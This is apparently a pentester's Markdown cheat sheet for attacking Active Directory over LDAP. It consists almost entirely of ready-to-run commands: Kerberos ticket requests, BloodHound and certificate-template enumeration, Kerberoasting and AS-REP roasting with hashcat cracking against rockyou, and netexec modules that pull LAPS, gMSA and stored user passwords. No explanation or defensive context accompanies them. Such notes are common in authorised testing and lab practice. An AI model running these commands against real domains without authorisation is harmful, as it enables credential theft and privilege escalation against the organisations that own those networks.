# LDAP
#target/remote #os/linux #cat/ad #proto/ldap #port/389

## LDAP all in one
```
getTGT.py <domain>/'<user>'<impacket_auth> && export KRB5CCNAME=$(pwd)/'<user>'.ccache

bloodyAD --host <fqdn> -d <domain> -u '<user>' -k get writable

rusthound-ce -z -c All -d <domain> -u '<user>' -k -f <fqdn> -i <dc_ip>

certipy find -vulnerable -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -stdout -timeout 2 -ldap-scheme ldap

nxc ldap <ip> --use-kcache --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --admin-count --pso --pass-pol --gmsa

nxc ldap <ip> --use-kcache -M adcs -M badsuccessor -M dns-nonsecure -M dump-computers -M entra-id -M get-network -M get-scriptpath -M maq -M obsolete -M sccm -M subnets -M tombstone -M whoami

nxc ldap <ip> --use-kcache -M get-desc-users -M get-info-users -M get-unixUserPassword -M get-userPassword -M laps -M pre2k

GetNPUsers.py -request -outputfile hashes.asreproast <domain>/'<user>' -k -no-pass -dc-host <fqdn>

[ -s hashes.asreproast ] && timeout 20 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet

[ -s hashes.kerberoast ] && timeout 20 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet

powerview <domain>/'<user>'@<dc_fqdn> -k --no-pass
```

## rusthound-ce
```
rusthound-ce -z -c All -d <domain> -u '<user>' <auth> -f <fqdn> -i <dc_ip>
```

## PowerView connect
```
powerview <domain>/'<user>'<auth> --no-cache
```

## Powerview anonymous connect
```
powerview <fqdn> --no-cache
```

## godap connect
```
godap <fqdn> -u '<user>' -d <domain> <auth> -t 'ldap/<fqdn>'
```
